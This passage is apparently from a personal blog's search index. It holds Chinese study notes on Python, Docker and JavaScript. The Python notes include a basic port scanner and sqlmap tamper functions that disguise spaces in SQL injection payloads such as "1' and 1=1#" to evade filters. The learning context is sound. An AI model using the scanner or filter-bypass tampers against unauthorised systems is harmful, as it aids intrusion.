class=\"line\">os.rmdir(<span class=\"string\">'./yyds'</span>)</span><br><span class=\"line\">os.listdir(<span class=\"string\">'./'</span>)</span><br><span class=\"line\">os.getcwd()</span><br><span class=\"line\">os.chdir(<span class=\"string\">'../'</span>)  <span class=\"comment\">#改变当前工作目录</span></span><br><span class=\"line\">os.system(<span class=\"string\">'dir'</span>)  <span class=\"comment\">#返回状态,0为成功,1为失败</span></span><br><span class=\"line\">res = os.popen(<span class=\"string\">'dir'</span>)  <span class=\"comment\">#返回一个对象</span></span><br><span class=\"line\">print(res.read())</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#捕捉异常</span></span><br><span class=\"line\"><span class=\"keyword\">try</span>:</span><br><span class=\"line\">  正常代码</span><br><span class=\"line\"><span class=\"keyword\">except</span> 错误:</span><br><span class=\"line\">  如果出现错误，执行这段代码</span><br><span class=\"line\"><span class=\"keyword\">finally</span>:</span><br><span class=\"line\">  最终执行这段代码</span><br><span class=\"line\">  </span><br><span class=\"line\"><span class=\"comment\">#网络编程</span></span><br><span class=\"line\"><span class=\"comment\">#非常简易的扫描器</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> sys</span><br><span class=\"line\"><span class=\"keyword\">import</span> socket</span><br><span class=\"line\"></span><br><span class=\"line\">port = [<span class=\"number\">21</span>,<span class=\"number\">22</span>,<span class=\"number\">23</span>,<span class=\"number\">80</span>,<span class=\"number\">135</span>,<span class=\"number\">139</span>,<span class=\"number\">443</span>,<span class=\"number\">1433</span>,<span class=\"number\">3306</span>,<span class=\"number\">3389</span>]</span><br><span class=\"line\">allports = [<span class=\"number\">0</span>,<span class=\"number\">65535</span>]</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">scan</span><span class=\"params\">(ip,port,*args,**kwargs)</span>:</span></span><br><span class=\"line\">    s = socket.socket()</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        s.connect((ip, port))</span><br><span class=\"line\">        print(<span class=\"string\">\"[+]The %s port %s is open\"</span>%(ip,port))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">True</span></span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">\"[+]The %s port %s is closed\"</span>%(ip,port))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">ports</span><span class=\"params\">(ip,port)</span>:</span><span class=\"comment\">#search some incoming specific parameters</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> port:</span><br><span class=\"line\">        scan(ip,p)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">convert</span><span class=\"params\">(array)</span>:</span></span><br><span class=\"line\">    a = []</span><br><span class=\"line\">    <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> array:</span><br><span class=\"line\">        a.append(int(x))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> a</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">portsplus</span><span class=\"params\">(ip,port)</span>:</span><span class=\"comment\">#search the parameters of an interval passed in</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> p <span class=\"keyword\">in</span> range(port[<span class=\"number\">0</span>],port[<span class=\"number\">1</span>]+<span class=\"number\">1</span>):</span><br><span class=\"line\">        scan(ip,p)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        <span class=\"keyword\">if</span> len(sys.argv) &lt; <span class=\"number\">2</span>:</span><br><span class=\"line\">            print(<span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">[+]You can read the following rules to use this tool.</span></span><br><span class=\"line\"><span class=\"string\">[+]python scanport.py host ports</span></span><br><span class=\"line\"><span class=\"string\">[+]The Default scanports are 21,22,23,80,135,139,443,1433,3306,3389</span></span><br><span class=\"line\"><span class=\"string\">[+]python scanport.py 127.0.0.1 80,90,3306,3389</span></span><br><span class=\"line\"><span class=\"string\">[+]python scanport.py 127.0.0.1 80-90</span></span><br><span class=\"line\"><span class=\"string\">[+]python scanport.py 127.0.0.1 all</span></span><br><span class=\"line\"><span class=\"string\">            '''</span>)</span><br><span class=\"line\">        <span class=\"keyword\">elif</span> len(sys.argv) == <span class=\"number\">2</span>:</span><br><span class=\"line\">            ports(sys.argv[<span class=\"number\">1</span>],port)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            ip = sys.argv[<span class=\"number\">1</span>]</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"string\">','</span> <span class=\"keyword\">in</span> sys.argv[<span class=\"number\">2</span>]:</span><br><span class=\"line\">                p = sys.argv[<span class=\"number\">2</span>]</span><br><span class=\"line\">                p = p.split(<span class=\"string\">','</span>)</span><br><span class=\"line\">                ports(ip,convert(p))</span><br><span class=\"line\">            <span class=\"keyword\">elif</span> <span class=\"string\">'-'</span> <span class=\"keyword\">in</span> sys.argv[<span class=\"number\">2</span>]:</span><br><span class=\"line\">                p = sys.argv[<span class=\"number\">2</span>]</span><br><span class=\"line\">                p = p.split(<span class=\"string\">'-'</span>)</span><br><span class=\"line\">                portsplus(ip,convert(p))</span><br><span class=\"line\">            <span class=\"keyword\">elif</span> sys.argv[<span class=\"number\">2</span>] == <span class=\"string\">'all'</span>:</span><br><span class=\"line\">                portsplus(ip,allports)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                port = int(sys.argv[<span class=\"number\">2</span>])</span><br><span class=\"line\">                scan(ip,port)</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">[+]There is something wrong!!!</span></span><br><span class=\"line\"><span class=\"string\">        '''</span>)</span><br><span class=\"line\">    <span class=\"keyword\">finally</span>:</span><br><span class=\"line\">        print(<span class=\"string\">'''</span></span><br><span class=\"line\"><span class=\"string\">[+]The task has been completed!!!</span></span><br><span class=\"line\"><span class=\"string\">        '''</span>)</span><br><span class=\"line\">        </span><br><span class=\"line\"><span class=\"comment\">#类和对象</span></span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Person</span>:</span></span><br><span class=\"line\">    __age = <span class=\"number\">18</span> <span class=\"comment\">#私有属性</span></span><br><span class=\"line\">    name = <span class=\"string\">'name'</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self,name)</span>:</span></span><br><span class=\"line\">        self.name = name;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">introduce</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        print(<span class=\"string\">\"my name is %s,and my age is %d\"</span>%((self.name),(self.__age)))</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__hello</span><span class=\"params\">(self)</span>:</span><span class=\"comment\">#私有方法</span></span><br><span class=\"line\">        print(<span class=\"string\">\"Hello!! My name is %s\"</span>%(self.name))</span><br><span class=\"line\"></span><br><span class=\"line\">pz1o = Person(<span class=\"string\">'pz1o'</span>)</span><br><span class=\"line\">pz1o.introduce()<span class=\"comment\">#公有方法调用</span></span><br><span class=\"line\">print(pz1o._Person__age)<span class=\"comment\">#私有属性调用</span></span><br><span class=\"line\">pz1o._Person__hello()<span class=\"comment\">#私有方法调用</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#tamper编写</span></span><br><span class=\"line\">--tamper scan.py</span><br><span class=\"line\"><span class=\"comment\">#绕空格</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">tamper</span><span class=\"params\">(payload,**kwargs)</span>:</span></span><br><span class=\"line\">    retVal = payload</span><br><span class=\"line\">    <span class=\"keyword\">if</span> payload:</span><br><span class=\"line\">        retVal = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> payload:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> x.isspace():</span><br><span class=\"line\">                retVal += <span class=\"string\">\"/**/\"</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                retVal += x</span><br><span class=\"line\">    <span class=\"keyword\">return</span> retVal</span><br><span class=\"line\"></span><br><span class=\"line\">print(tamper(<span class=\"string\">\"1' and 1=1#\"</span>))</span><br><span class=\"line\"><span class=\"comment\">#不过滤引号里的内容</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">tamper</span><span class=\"params\">(payload,**kwargs)</span>:</span></span><br><span class=\"line\">    retVal = payload</span><br><span class=\"line\">    <span class=\"keyword\">if</span> payload:</span><br><span class=\"line\">        retVal = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        flag = <span class=\"literal\">False</span></span><br><span class=\"line\">        <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> payload:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> x == <span class=\"string\">\"'\"</span> <span class=\"keyword\">or</span> x == <span class=\"string\">'\"'</span>:</span><br><span class=\"line\">                flag = <span class=\"keyword\">not</span> flag</span><br><span class=\"line\">                retVal += <span class=\"string\">\"'\"</span></span><br><span class=\"line\">            <span class=\"keyword\">elif</span> x.isspace() <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> flag:</span><br><span class=\"line\">                retVal += <span class=\"string\">\"/**/\"</span></span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                retVal += x</span><br><span class=\"line\">    <span class=\"keyword\">return</span> retVal</span><br><span class=\"line\"></span><br><span class=\"line\">print(tamper(<span class=\"string\">\"1' my name is pz1o' and 1=1#\"</span>))</span><br></pre></td></tr></table></figure>\n","categories":["开发"],"tags":["python"]},{"title":"Docker学习","url":"https://pz1o.top/2020/08/07/Docker学习/","content":"<a id=\"more\"></a>\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>白嫖的阿里云服务器不能浪费了，来学习一下docker,只记录一下重要的。</p>\n<p>b站学习资源<a href=\"https://www.bilibili.com/video/BV1og4y1q7M4?\" target=\"_blank\" rel=\"noopener\">https://www.bilibili.com/video/BV1og4y1q7M4?</a></p>\n<h1 id=\"Docker基础\"><a href=\"#Docker基础\" class=\"headerlink\" title=\"Docker基础\"></a>Docker基础</h1><h2 id=\"基本概念\"><a href=\"#基本概念\" class=\"headerlink\" title=\"基本概念\"></a>基本概念</h2><p><img src=\"/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200812213743035.png\" alt=\"image-20200812213743035\"></p>\n<p>镜像（ Image ） ：Docker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。 </p>\n<p>容器（ Container ） ：镜像（ Image ）和容器（ Container ）的关系，就像是面向对象程序设计中的 类 和实例 一样，镜像是静态的定义，容器是镜像运行时的实体。容器可以被创建、启动、停止、删除、暂停等。</p>\n<p>仓库（ Repository ）：一个 <strong>Docker Registry</strong> 中可以包含多个仓库（ Repository ）；每个仓库可以包含多个标签（ Tag ）；每个标签对应一个镜像。</p>\n<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">//1.卸载旧版本</span><br><span class=\"line\">sudo yum remove docker \\</span><br><span class=\"line\">                   docker-client \\</span><br><span class=\"line\">                   docker-client-latest \\</span><br><span class=\"line\">                   docker-common \\</span><br><span class=\"line\">                   docker-latest \\</span><br><span class=\"line\">                   docker-latest-logrotate \\</span><br><span class=\"line\">                   docker-logrotate \\</span><br><span class=\"line\">                   docker-engine</span><br><span class=\"line\"></span><br><span class=\"line\">//2.需要安装安装包</span><br><span class=\"line\">yum install -y yum-utils</span><br><span class=\"line\">//3.设置镜像仓库</span><br><span class=\"line\">yum-config-manager \\</span><br><span class=\"line\">    --add-repo \\</span><br><span class=\"line\">    http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br><span class=\"line\">//4.更新yum</span><br><span class=\"line\">yum makecache fast</span><br><span class=\"line\">//5.安装docker</span><br><span class=\"line\">yum install docker-ce docker-ce-cli containerd.io</span><br><span class=\"line\">一直y</span><br><span class=\"line\">//6.启动docker</span><br><span class=\"line\">systemctl start docker</span><br><span class=\"line\">//7.测试docker</span><br><span class=\"line\">docker version </span><br><span class=\"line\">docker run hello-world</span><br><span class=\"line\">//8.docker镜像</span><br><span class=\"line\">docker images</span><br></pre></td></tr></table></figure>\n<p><img src=\"/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200812224856499.png\" alt=\"image-20200812224856499\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#x2F;&#x2F;卸载docker</span><br><span class=\"line\">yum remove docker-ce docker-ce-cli containerd.io</span><br><span class=\"line\">rm -rf &#x2F;var&#x2F;lib&#x2F;docker</span><br><span class=\"line\">&#x2F;var&#x2F;lib&#x2F;docker docker 默认工作路径</span><br></pre></td></tr></table></figure>\n<p><strong>run的流程</strong></p>\n<p><img src=\"/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200813152655350.png\" alt=\"image-20200813152655350\"></p>\n<h2 id=\"Docker与vm\"><a href=\"#Docker与vm\" class=\"headerlink\" title=\"Docker与vm\"></a>Docker与vm</h2><p>传统虚拟机技术是虚拟出一套硬件后，在其上运行一个完整操作系统，在该系统上再运行所需应用进程。<strong>容器内的应用进程直接运行于宿主的内核，容器内没有自己的内核，而且也没有进行硬件虚拟。</strong>因此容器要比传统虚拟机更为轻便。</p>\n<p><img src=\"/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200813153605377.png\" alt=\"image-20200813153605377\"></p>\n<p><img src=\"/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20200813153615560.png\" alt=\"image-20200813153615560\"></p>\n<h2 id=\"常用命令\"><a href=\"#常用命令\" class=\"headerlink\" title=\"常用命令\"></a>常用命令</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker version  &#x2F;&#x2F;版本信息</span><br><span class=\"line\">docker info  &#x2F;&#x2F;系统信息</span><br></pre></td></tr></table></figure>\n<p>文档：<a href=\"https://docs.docker.com/\" target=\"_blank\" rel=\"noopener\">https://docs.docker.com/</a></p>\n<p><strong>镜像命令</strong></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker images -a  //列出所有镜像</span><br><span class=\"line\">dokcer images -q  //只显示id</span><br><span class=\"line\"><span class=\"meta\">[root@/]#</span><span class=\"bash\"> docker images</span></span><br><span class=\"line\">REPOSITORY(镜像的仓库源)          TAG(标签)                 IMAGE ID(镜像的id)            CREATED(创建时间)             SIZE(大小)</span><br><span class=\"line\">hello-world         latest              bf756fb1ae65        7 months ago        13.3kB</span><br><span class=\"line\"></span><br><span class=\"line\">docker search  mysql  //搜索镜像</span><br><span class=\"line\">dokcer pull mysql[:tag]  //下载镜像</span><br><span class=\"line\">docker pull docker.io/library/mysql:latest</span><br><span class=\"line\">docker rmi -f id  //删除镜像</span><br><span class=\"line\">docker rmi -f $(docker images -aq)  //删除全部镜像</span><br></pre></td></tr></table></figure>\n<p><strong>容器命令</strong></p>\n<p>==有镜像才可以创建容器，先安装一个centos==</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker pull centos</span><br><span class=\"line\">docker run [参数] image  //新建容器并启动</span><br><span class=\"line\">--name=\"name1\"  //容器名字</span><br><span class=\"line\">-d  //后台运行</span><br><span class=\"line\">-P  //随机把容器的端口映射到一个主机未使用的高端口</span><br><span class=\"line\">-i  //以交互模式运行容器，常与-t连用</span><br><span class=\"line\">-t  //为容器重新分配一个伪输入终端，常与-i连用</span><br><span class=\"line\">-it  //交互方式运行</span><br><span class=\"line\">-p ip：主机端口：容器端口  //指定容器端口</span><br><span class=\"line\"></span><br><span class=\"line\">docker ps //正在运行的容器</span><br><span class=\"line\">docker ps -a  //历史运行的容器</span><br><span class=\"line\">docker rm 容器id  //删除容器</span><br><span class=\"line\">docker rm -f $(docker ps -aq)  //删除所有容器</span><br><span class=\"line\">docker start 容器id  //启动容器</span><br><span class=\"line\">docker restart 容器id  //重启容器</span><br><span class=\"line\">docker stop 容器id  //停止容器</span><br><span class=\"line\">docker kill 容器id  //杀死容器</span><br><span class=\"line\"></span><br><span class=\"line\">//进入容器</span><br><span class=\"line\">docker run -it centos /bin/bash</span><br><span class=\"line\">//退出容器</span><br><span class=\"line\">exit  停止退出</span><br><span class=\"line\">ctrl+p+q  不停止退出</span><br></pre></td></tr></table></figure>\n<h2 id=\"从github复现CTF\"><a href=\"#从github复现CTF\" class=\"headerlink\" title=\"从github复现CTF\"></a>从github复现CTF</h2><p>首先从github上clone下来</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone xxx</span><br></pre></td></tr></table></figure>\n<p>若有docker.yml直接</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker-compose build</span><br><span class=\"line\">docker-compose up -d</span><br><span class=\"line\"></span><br><span class=\"line\">docker ps #查看端口号</span><br></pre></td></tr></table></figure>\n<p>如果有dockerfile</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">进入dockerfile目录</span><br><span class=\"line\">设置权限</span><br><span class=\"line\">docker build -t &#39;自定义镜像名称&#39; .(最后有一个点)</span><br><span class=\"line\">docker run --name&#x3D;&#39;自定义容器名称&#39; -i -d -P 镜像名称 &#x2F;run.sh</span><br><span class=\"line\">docker ps &#x2F;&#x2F;查看端口号</span><br></pre></td></tr></table></figure>\n<p>查看端口号</p>\n<p><img src=\"/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20201006151417590.png\" alt=\"image-20201006151417590\"></p>\n<p>部署完成</p>\n<p><img src=\"/2020/08/07/Docker%E5%AD%A6%E4%B9%A0/image-20201006151456458.png\" alt=\"image-20201006151456458\"></p>\n","categories":["Docker"],"tags":["others"]},{"title":"Javascript学习","url":"https://pz1o.top/2020/07/09/javascript学习/","content":"<a id=\"more\"></a>\n<h1 id=\"Javascript\"><a href=\"#Javascript\" class=\"headerlink\" title=\"Javascript\"></a>Javascript</h1><p>参考廖雪峰教程<a href=\"https://www.liaoxuefeng.com/wiki/1022910821149312\" target=\"_blank\" rel=\"noopener\">https://www.liaoxuefeng.com/wiki/1022910821149312</a></p>\n<h1 id=\"入门javascript\"><a href=\"#入门javascript\" class=\"headerlink\" title=\"入门javascript\"></a>入门javascript</h1><h2 id=\"引入javascript\"><a href=\"#引入javascript\" class=\"headerlink\" title=\"引入javascript\"></a>引入javascript</h2><p><strong>内部标签</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t/...</span><br><span class=\"line\">\t..</span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p><strong>外部引入</strong></p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">src</span>=<span class=\"string\">\"./..\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"基本语法\"><a href=\"#基本语法\" class=\"headerlink\" title=\"基本语法\"></a>基本语法</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 变量</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> num = <span class=\"number\">1</span>;</span><br><span class=\"line\"><span class=\"comment\">// 条件控制</span></span><br><span class=\"line\"><span class=\"keyword\">if</span>()&#123;</span><br><span class=\"line\">..</span><br><span class=\"line\">&#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">..</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//console.log(num)</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"数据类型\"><a href=\"#数据类型\" class=\"headerlink\" title=\"数据类型\"></a>数据类型</h2><p><strong>变量</strong></p>\n<p>变量名是大小写英文、数字、<code>$</code>和<code>_</code>的组合，且不能用数字开头</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> $<span class=\"number\">1</span> = <span class=\"string\">\"a\"</span>;</span><br></pre></td></tr></table></figure>\n<p><strong>数字</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">123</span> <span class=\"comment\">//整数</span></span><br><span class=\"line\"><span class=\"number\">123.1</span> <span class=\"comment\">//浮点数</span></span><br><span class=\"line\"><span class=\"number\">1.1e1</span> <span class=\"comment\">//科学计数法</span></span><br><span class=\"line\"><span class=\"literal\">NaN</span>  <span class=\"comment\">//not a number</span></span><br><span class=\"line\"><span class=\"string\">'abc'</span> <span class=\"comment\">//字符串</span></span><br><span class=\"line\"><span class=\"literal\">true</span> <span class=\"comment\">//布尔值</span></span><br></pre></td></tr></table></figure>\n<p><strong>比较运算符</strong></p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">=</span><br><span class=\"line\">== 等于（类型不一样，值一样）</span><br><span class=\"line\">===  绝对等于（类型一样，值一样）</span><br></pre></td></tr></table></figure>\n<ol>\n<li>NaN===NaN是false，它与任何值都不相等，包括自己。</li>\n<li>isNaN（NaN）会返回true。</li>\n</ol>\n<p><strong>数组</strong></p>\n<blockquote>\n<p>中括号</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> arr = [<span class=\"number\">1</span>,<span class=\"number\">2</span>,<span class=\"number\">3</span>,<span class=\"string\">\"hello\"</span>]</span><br></pre></td></tr></table></figure>\n<p><strong>对象</strong></p>\n<blockquote>\n<p>大括号,每个属性用逗号隔开，最后不需要</p>\n</blockquote>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> person = &#123;</span><br><span class=\"line\">\t\tname: <span class=\"string\">\"111\"</span>,</span><br><span class=\"line\">\t\tage: <span class=\"number\">3</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">person.name</span><br><span class=\"line\">&gt;<span class=\"number\">111</span></span><br><span class=\"line\">person.age</span><br><span class=\"line\">&gt;<span class=\"number\">3</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"strict模式\"><a href=\"#strict模式\" class=\"headerlink\" title=\"strict模式\"></a><strong>strict模式</strong></h3><p>在同一个页面的不同的JavaScript文件中，如果都不用<code>var</code>申明，恰好都使用了变量<code>i</code>，将造成变量<code>i</code>互相影响，产生难以调试的错误结果。</p>\n<p>使用<code>var</code>申明的变量则不是全局变量，它的范围被限制在该变量被申明的函数体内（函数的概念将稍后讲解），同名变量在不同的函数体内互不冲突。</p>\n<p>为了修补JavaScript这一严重设计缺陷，ECMA在后续规范中推出了strict模式，在strict模式下运行的JavaScript代码，强制通过<code>var</code>申明变量，未使用<code>var</code>申明变量就使用的，将导致运行错误。</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">'use strict'</span>;</span><br><span class=\"line\">abc = <span class=\"string\">\"\"</span>hello world<span class=\"string\">\";</span></span><br><span class=\"line\"><span class=\"string\">//使用strict模式上面代码会报错</span></span><br><span class=\"line\"><span class=\"string\">var abc = \"</span>hello world<span class=\"string\">\";</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"字符串\"><a href=\"#字符串\" class=\"headerlink\" title=\"字符串\"></a>字符串</h2><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//转义字符</span></span><br><span class=\"line\">\\n</span><br><span class=\"line\">\\t</span><br><span class=\"line\"><span class=\"string\">'\\x41'</span>; <span class=\"comment\">// 完全等同于 'A'</span></span><br><span class=\"line\"><span class=\"string\">'\\u4e2d\\u6587'</span>; <span class=\"comment\">// 完全等同于 '中文'</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"多行字符串\"><a href=\"#多行字符串\" class=\"headerlink\" title=\"多行字符串\"></a><strong>多行字符串</strong></h3><p>由于多行字符串用<code>\\n</code>写起来比较费事，所以最新的ES6标准新增了一种多行字符串的表示方法，用反引号 ``表示</p>\n<h3 id=\"模板字符串\"><a href=\"#模板字符串\" class=\"headerlink\" title=\"模板字符串\"></a><strong>模板字符串</strong></h3><p>要把多个字符串连接起来,可以用<code>+</code>也可以用<code>`${..}</code>表示</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span 